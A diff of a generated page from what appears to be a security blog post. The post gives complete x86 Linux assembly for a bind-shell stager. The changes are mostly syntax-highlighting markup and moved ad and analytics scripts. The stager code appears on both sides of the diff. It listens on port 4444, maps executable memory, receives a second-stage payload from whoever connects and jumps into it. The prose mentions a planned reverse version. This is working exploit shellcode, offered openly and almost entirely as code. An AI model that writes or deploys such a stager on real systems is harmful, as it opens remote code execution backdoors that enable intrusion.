@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2010/04/21/linux-bind-stager-x86-wip-unoptimised.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -273,161 +253,162 @@ My guess for it’s usage would be for jailbreaking (restricted shell but vulner
 153
 154
 155
-</pre></td><td class="code"><pre><span class="c">; AGPL v3</span>
-<span class="c">; Author : m_101</span>
+</pre></td><td class="code"><pre><span class="c1">; AGPL v3</span>
+<span class="c1">; Author : m_101</span>
 
-<span class="n">bits</span> <span class="mi">32</span>
+<span class="nf">bits</span> <span class="mi">32</span>
 
-<span class="c">; socket function number</span>
-<span class="cp">%define</span> <span class="n">SYS_SOCKET</span>  <span class="mi">1</span>
-<span class="cp">%define</span> <span class="n">SYS_BIND</span>    <span class="mi">2</span>
-<span class="cp">%define</span> <span class="n">SYS_LISTEN</span>  <span class="mi">4</span>
-<span class="cp">%define</span> <span class="n">SYS_ACCEPT</span>  <span class="mi">5</span>
-<span class="cp">%define</span> <span class="n">SYS_RECV</span>    <span class="mi">10</span>
+<span class="c1">; socket function number</span>
+<span class="cp">%define SYS_SOCKET  1
+%define SYS_BIND    2
+%define SYS_LISTEN  4
+%define SYS_ACCEPT  5
+%define SYS_RECV    10
+</span>
+<span class="c1">;</span>
+<span class="cp">%define AF_INET     2
 
-<span class="c">;</span>
-<span class="cp">%define</span> <span class="n">AF_INET</span>     <span class="mi">2</span>
+%define SOCK_STREAM 1
 
-<span class="cp">%define</span> <span class="n">SOCK_STREAM</span> <span class="mi">1</span>
+%define PROT_NONE   0
+%define PROT_READ   1
+%define PROT_WRITE  2
+%define PROT_EXEC   4
 
-<span class="cp">%define</span> <span class="n">PROT_NONE</span>   <span class="mi">0</span>
-<span class="cp">%define</span> <span class="n">PROT_READ</span>   <span class="mi">1</span>
-<span class="cp">%define</span> <span class="n">PROT_WRITE</span>  <span class="mi">2</span>
-<span class="cp">%define</span> <span class="n">PROT_EXEC</span>   <span class="mi">4</span>
+%define MAP_SHARED  1
+%define MAP_PRIVATE 2
+%define MAP_FIXED   16
+</span>
+<span class="c1">;</span>
+<span class="cp">%define SIZEOF_SOCKADDR_IN  16
+</span>
+<span class="c1">;</span>
+<span class="cp">%define PORT    4444
+</span>
+<span class="nf">section</span> <span class="nv">.text</span>
 
-<span class="cp">%define</span> <span class="n">MAP_SHARED</span>  <span class="mi">1</span>
-<span class="cp">%define</span> <span class="n">MAP_PRIVATE</span> <span class="mi">2</span>
-<span class="cp">%define</span> <span class="n">MAP_FIXED</span>   <span class="mi">16</span>
+<span class="nl">stager:</span>
+<span class="c1">; socket opening</span>
+<span class="nl">socket:</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="mi">102</span>   <span class="c1">; socketcall</span>
+<span class="nf">pop</span> <span class="nb">eax</span>
+<span class="c1">; args</span>
+<span class="nf">cdq</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">2</span>  <span class="c1">; edx = 2 &lt;=&gt; AF_INET</span>
+<span class="nf">push</span> <span class="nb">edx</span>
+<span class="nf">dec</span> <span class="nb">edx</span>         <span class="c1">; edx = 1 &lt;=&gt; SOCK_STREAM</span>
+<span class="nf">push</span> <span class="nb">edx</span>
+<span class="nf">cdq</span>             <span class="c1">; reset edx</span>
+<span class="nf">push</span> <span class="nb">edx</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="c1">; socket</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="nv">SYS_SOCKET</span>
+<span class="nf">pop</span> <span class="nb">ebx</span>
+<span class="c1">; socket (AF_INET, SOCK_STREAM, 0)</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>    <span class="c1">; save socket descriptor</span>
+<span class="c1">; bind : need to finish it</span>
+<span class="nl">bind:</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="mi">102</span>   <span class="c1">; socketcall</span>
+<span class="nf">pop</span> <span class="nb">eax</span>
+<span class="nf">cdq</span>             <span class="c1">; reset edx</span>
+<span class="c1">; constructing struct sockaddr_in</span>
+<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; padding</span>
+<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; padding</span>
+<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">; address = 0 = ANY_ADDRESS</span>
+<span class="nf">push</span> <span class="kt">word</span> <span class="nv">PORT</span>      <span class="c1">; sin_port</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="nv">AF_INET</span>   <span class="c1">; sin_family</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">; struct sockaddr_in *addr</span>
 
-<span class="c">;</span>
-<span class="cp">%define</span> <span class="n">SIZEOF_SOCKADDR_IN</span>  <span class="mi">16</span>
+<span class="c1">; construct args array</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="nb">SI</span><span class="nv">ZEOF_SOCKADDR_IN</span>    <span class="c1">; socklen_t addrlen</span>
+<span class="nf">push</span> <span class="nb">ecx</span>                        <span class="c1">; struct sockaddr_in *addr</span>
+<span class="nf">push</span> <span class="nb">esi</span>                        <span class="c1">; socket descriptor</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>                    <span class="c1">; args</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="nv">SYS_BIND</span>
+<span class="nf">pop</span> <span class="nb">ebx</span>
+<span class="c1">; bind (sd, addr, 16)</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
 
-<span class="c">;</span>
-<span class="cp">%define</span> <span class="n">PORT</span>    <span class="mi">4444</span>
-
-<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
-
-<span class="n">stager</span><span class="o">:</span>
-<span class="c">; socket opening</span>
-<span class="n">socket</span><span class="o">:</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="mi">102</span>   <span class="c">; socketcall</span>
-<span class="k">pop</span> <span class="n">eax</span>
-<span class="c">; args</span>
-<span class="k">cdq</span>
-<span class="k">mov</span> <span class="n">byte</span> <span class="n">dl</span><span class="p">,</span> <span class="mi">2</span>  <span class="c">; edx = 2 &lt;=&gt; AF_INET</span>
-<span class="k">push</span> <span class="n">edx</span>
-<span class="k">dec</span> <span class="n">edx</span>         <span class="c">; edx = 1 &lt;=&gt; SOCK_STREAM</span>
-<span class="k">push</span> <span class="n">edx</span>
-<span class="k">cdq</span>             <span class="c">; reset edx</span>
-<span class="k">push</span> <span class="n">edx</span>
-<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>
-<span class="c">; socket</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="n">SYS_SOCKET</span>
-<span class="k">pop</span> <span class="n">ebx</span>
-<span class="c">; socket (AF_INET, SOCK_STREAM, 0)</span>
-<span class="k">int</span> <span class="mh">0x80</span>
-<span class="k">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; save socket descriptor</span>
-<span class="c">; bind : need to finish it</span>
-<span class="n">bind</span><span class="o">:</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="mi">102</span>   <span class="c">; socketcall</span>
-<span class="k">pop</span> <span class="n">eax</span>
-<span class="k">cdq</span>             <span class="c">; reset edx</span>
-<span class="c">; constructing struct sockaddr_in</span>
-<span class="k">push</span> <span class="n">edx</span>            <span class="c">; padding</span>
-<span class="k">push</span> <span class="n">edx</span>            <span class="c">; padding</span>
-<span class="k">push</span> <span class="n">edx</span>            <span class="c">; address = 0 = ANY_ADDRESS</span>
-<span class="k">push</span> <span class="n">word</span> <span class="n">PORT</span>      <span class="c">; sin_port</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="n">AF_INET</span>   <span class="c">; sin_family</span>
-<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>        <span class="c">; struct sockaddr_in *addr</span>
-
-<span class="c">; construct args array</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="n">SIZEOF_SOCKADDR_IN</span>    <span class="c">; socklen_t addrlen</span>
-<span class="k">push</span> <span class="n">ecx</span>                        <span class="c">; struct sockaddr_in *addr</span>
-<span class="k">push</span> <span class="n">esi</span>                        <span class="c">; socket descriptor</span>
-<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>                    <span class="c">; args</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="n">SYS_BIND</span>
-<span class="k">pop</span> <span class="n">ebx</span>
-<span class="c">; bind (sd, addr, 16)</span>
-<span class="k">int</span> <span class="mh">0x80</span>
-
-<span class="c">; listen</span>
-<span class="n">listen</span><span class="o">:</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="mi">102</span>
-<span class="k">pop</span> <span class="n">eax</span>
-<span class="k">cdq</span>             <span class="c">; reset edx</span>
-<span class="k">mov</span> <span class="n">byte</span> <span class="n">dl</span><span class="p">,</span> <span class="mi">10</span> <span class="c">; backlog = 10</span>
-<span class="k">push</span> <span class="n">edx</span>        <span class="c">; backlog</span>
-<span class="k">push</span> <span class="n">esi</span>        <span class="c">; socket descriptor</span>
-<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; args</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="n">SYS_LISTEN</span>
-<span class="k">pop</span> <span class="n">ebx</span>
-<span class="c">; listen (sd, 10);</span>
-<span class="k">int</span> <span class="mh">0x80</span>
-<span class="c">;</span>
-<span class="n">accept</span><span class="o">:</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="mi">102</span>      <span class="c">; socketcall</span>
-<span class="k">pop</span> <span class="n">eax</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="n">SIZEOF_SOCKADDR_IN</span>
-<span class="k">push</span> <span class="n">esp</span>    <span class="c">; to fix size address</span>
-<span class="k">push</span> <span class="n">esp</span>    <span class="c">; to fix sockaddr_in address</span>
-<span class="k">push</span> <span class="n">esi</span>
-<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; args array</span>
-<span class="k">mov</span> <span class="n">byte</span> <span class="n">bl</span><span class="p">,</span> <span class="n">SYS_ACCEPT</span>
-<span class="k">int</span> <span class="mh">0x80</span>
-<span class="k">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; save client socket</span>
+<span class="c1">; listen</span>
+<span class="nl">listen:</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="mi">102</span>
+<span class="nf">pop</span> <span class="nb">eax</span>
+<span class="nf">cdq</span>             <span class="c1">; reset edx</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">10</span> <span class="c1">; backlog = 10</span>
+<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">; backlog</span>
+<span class="nf">push</span> <span class="nb">esi</span>        <span class="c1">; socket descriptor</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; args</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="nv">SYS_LISTEN</span>
+<span class="nf">pop</span> <span class="nb">ebx</span>
+<span class="c1">; listen (sd, 10);</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+<span class="c1">;</span>
+<span class="nl">accept:</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="mi">102</span>      <span class="c1">; socketcall</span>
+<span class="nf">pop</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="nb">SI</span><span class="nv">ZEOF_SOCKADDR_IN</span>
+<span class="nf">push</span> <span class="nb">esp</span>    <span class="c1">; to fix size address</span>
+<span class="nf">push</span> <span class="nb">esp</span>    <span class="c1">; to fix sockaddr_in address</span>
+<span class="nf">push</span> <span class="nb">esi</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; args array</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="nb">bl</span><span class="p">,</span> <span class="nv">SYS_ACCEPT</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>    <span class="c1">; save client socket</span>
 
 
-<span class="c">; memory allocation</span>
-<span class="c">; mmap</span>
-<span class="n">mmap</span><span class="o">:</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="mi">90</span>
-<span class="k">pop</span> <span class="n">eax</span>
-<span class="c">; sign extend eax =&gt; edx = 0</span>
-<span class="k">cdq</span>
-<span class="c">; construct args</span>
-<span class="k">push</span> <span class="n">edx</span>    <span class="c">; NULL</span>
-<span class="c">; 4MB size</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="mi">1</span>
-<span class="k">pop</span> <span class="n">edx</span>
-<span class="k">shr</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">12</span>
-<span class="k">push</span> <span class="n">edx</span>        <span class="c">; edx = 4MB</span>
-<span class="k">xchg</span> <span class="n">edx</span><span class="p">,</span> <span class="n">ebx</span>   <span class="c">; ebx = 4MB</span>
-<span class="c">; PROT_READ | PROT_WRITE | PROT_EXEC = 7</span>
-<span class="k">cdq</span>
-<span class="k">mov</span> <span class="n">byte</span> <span class="n">dl</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span>
-<span class="k">push</span> <span class="n">edx</span>
-<span class="c">; MAP_PRIVATE</span>
-<span class="k">cdq</span>
-<span class="k">mov</span> <span class="n">byte</span> <span class="n">dl</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span>
-<span class="k">push</span> <span class="n">edx</span>
-<span class="c">; fd</span>
-<span class="k">push</span> <span class="n">edi</span>    <span class="c">; client socket</span>
-<span class="c">; offset</span>
-<span class="k">cdq</span>         <span class="c">; reset edx</span>
-<span class="k">push</span> <span class="n">edx</span>    <span class="c">; offset = 0</span>
-<span class="c">; mmap (NULL, 4MB, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, 0, 0)</span>
-<span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; make syscall</span>
-<span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; save allocated memory</span>
+<span class="c1">; memory allocation</span>
+<span class="c1">; mmap</span>
+<span class="nl">mmap:</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="mi">90</span>
+<span class="nf">pop</span> <span class="nb">eax</span>
+<span class="c1">; sign extend eax =&gt; edx = 0</span>
+<span class="nf">cdq</span>
+<span class="c1">; construct args</span>
+<span class="nf">push</span> <span class="nb">edx</span>    <span class="c1">; NULL</span>
+<span class="c1">; 4MB size</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="mi">1</span>
+<span class="nf">pop</span> <span class="nb">edx</span>
+<span class="nf">shr</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">12</span>
+<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">; edx = 4MB</span>
+<span class="nf">xchg</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>   <span class="c1">; ebx = 4MB</span>
+<span class="c1">; PROT_READ | PROT_WRITE | PROT_EXEC = 7</span>
+<span class="nf">cdq</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="nb">dl</span><span class="p">,</span> <span class="nv">PROT_READ</span> <span class="o">|</span> <span class="nv">PROT_WRITE</span> <span class="o">|</span> <span class="nv">PROT_EXEC</span>
+<span class="nf">push</span> <span class="nb">edx</span>
+<span class="c1">; MAP_PRIVATE</span>
+<span class="nf">cdq</span>
+<span class="nf">mov</span> <span class="kt">byte</span> <span class="nb">dl</span><span class="p">,</span> <span class="nv">MAP_PRIVATE</span>
+<span class="nf">push</span> <span class="nb">edx</span>
+<span class="c1">; fd</span>
+<span class="nf">push</span> <span class="nb">edi</span>    <span class="c1">; client socket</span>
+<span class="c1">; offset</span>
+<span class="nf">cdq</span>         <span class="c1">; reset edx</span>
+<span class="nf">push</span> <span class="nb">edx</span>    <span class="c1">; offset = 0</span>
+<span class="c1">; mmap (NULL, 4MB, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, 0, 0)</span>
+<span class="nf">int</span> <span class="mh">0x80</span>        <span class="c1">; make syscall</span>
+<span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>    <span class="c1">; save allocated memory</span>
 
-<span class="n">recv</span><span class="o">:</span>
-<span class="k">push</span> <span class="n">byte</span> <span class="mi">102</span>   <span class="c">; socketcall syscall</span>
-<span class="k">pop</span> <span class="n">eax</span>
+<span class="nl">recv:</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="mi">102</span>   <span class="c1">; socketcall syscall</span>
+<span class="nf">pop</span> <span class="nb">eax</span>
 
-<span class="k">cdq</span>             <span class="c">; reset edx</span>
-<span class="k">push</span> <span class="n">edx</span>        <span class="c">; flag</span>
-<span class="k">push</span> <span class="n">ebx</span>        <span class="c">; memory allocated size</span>
-<span class="k">push</span> <span class="n">edi</span>        <span class="c">; memory address</span>
-<span class="k">push</span> <span class="n">esi</span>        <span class="c">; client socket descriptor</span>
-<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; args</span>
+<span class="nf">cdq</span>             <span class="c1">; reset edx</span>
+<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">; flag</span>
+<span class="nf">push</span> <span class="nb">ebx</span>        <span class="c1">; memory allocated size</span>
+<span class="nf">push</span> <span class="nb">edi</span>        <span class="c1">; memory address</span>
+<span class="nf">push</span> <span class="nb">esi</span>        <span class="c1">; client socket descriptor</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>    <span class="c1">; args</span>
 
-<span class="k">push</span> <span class="n">byte</span> <span class="n">SYS_RECV</span>
-<span class="k">pop</span> <span class="n">ebx</span>
+<span class="nf">push</span> <span class="kt">byte</span> <span class="nv">SYS_RECV</span>
+<span class="nf">pop</span> <span class="nb">ebx</span>
 
-<span class="c">; recv (client socket descriptor, memory address, 4MB, 0);</span>
-<span class="k">int</span> <span class="mh">0x80</span>
+<span class="c1">; recv (client socket descriptor, memory address, 4MB, 0);</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
 
-<span class="c">; stage execution</span>
-<span class="k">jmp</span> <span class="n">edi</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="c1">; stage execution</span>
+<span class="nf">jmp</span> <span class="nb">edi</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Next thing to do is to optimized it and do the reverse version ;) .</p>
 
@@ -539,6 +520,26 @@ My guess for it’s usage would be for jailbreaking (restricted shell but vulner
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
